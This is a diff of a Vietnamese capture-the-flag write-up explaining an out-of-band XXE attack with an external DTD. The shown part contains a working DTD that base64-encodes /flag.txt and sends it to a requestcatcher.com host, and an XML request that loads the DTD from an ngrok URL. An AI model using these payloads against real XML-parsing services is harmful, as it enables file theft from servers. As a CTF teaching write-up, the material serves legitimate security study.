@@ -177,20 +177,24 @@ Sau một hồi test, thì mình thấy phải sử dụng `XXE OOB with DTD and
 
 - Trong kỹ thuật này mình cần tạo một server có chức năng truyền file khi một request yêu cầu (mình sẽ tận dụng kali linux + ngrok) và cần một nơi để bắt được request đến (mình sẽ sử dụng [requestcatcher.com](https://duypt.requestcatcher.com/)):
 + Đầu tiên mình sẽ tạo một file XML trong server của mình đặt tên là `dtd.xml`, với nội dụng như sau:
-`<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://duypt.requestcatcher.com/dtd.xml?%data;'>">`
+`
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://duypt.requestcatcher.com/dtd.xml?%data;'>">
+`
 
 --> Script này thực hiện việc gửi dữ liệu trong file `/flag.txt` tới `https://duypt.requestcatcher.com/`
 
 + Chuyển sang Burp Suite để request đến trang Web của BTC, mình sẽ request với nội dung như sau:
-`<?xml version="1.0" ?>
+`
+<?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
 <!ENTITY % sp SYSTEM "https://6826-113-167-248-183.ap.ngrok.io/dtd.xml">
 %sp;
 %param1;
 ]>
-<r>&exfil;</r>`
+<r>&exfil;</r>
+`
 
 --> Script này sẽ thực hiện việc truy vấn đến server mà ta đã dựng sẵn để lấy file `dtd.xml` chứa các entities mà ta đã định nghĩa sẵn, sau đó sẽ gọi và thực thi các entities đó
 
